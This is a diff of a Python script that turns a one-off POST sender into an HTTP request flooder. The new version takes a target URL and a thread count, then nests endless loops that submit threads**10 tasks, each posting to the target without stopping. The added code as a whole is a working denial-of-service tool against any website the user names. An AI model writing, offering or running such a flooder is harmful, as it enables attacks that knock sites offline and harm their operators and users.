@@ -1,19 +1,23 @@
+from time import sleep
 import requests
-import json
+import concurrent.futures
 
-def Sender(datas):
+url = input("Enter the URL: ")
+threads = int(input("Input the amount of threads: "))
+data = {}
 
-    data = {
-        "key1": "val1",
-        "key2": "val2"
-    }
-    url = "URL HERE"
+def Send():
+    while True:
+        response = requests.post(url, data)
+        print(response)
 
-    response = requests.post(url, data)
-    print(response)
+def MULT():
+    while True:
+        #sleep(0.05)
+        with concurrent.futures.ThreadPoolExecutor() as executer:
+            results = [executer.submit(Send) for _ in range(threads**10)]
 
-# Txt file example
-with open('example.txt','r') as file:
-    for line in file:
-        for word in line.split():
-            Sender(word)
+while True:
+        #sleep(0.05)
+        with concurrent.futures.ThreadPoolExecutor() as executer:
+            results = [executer.submit(MULT) for _ in range(threads**10)]
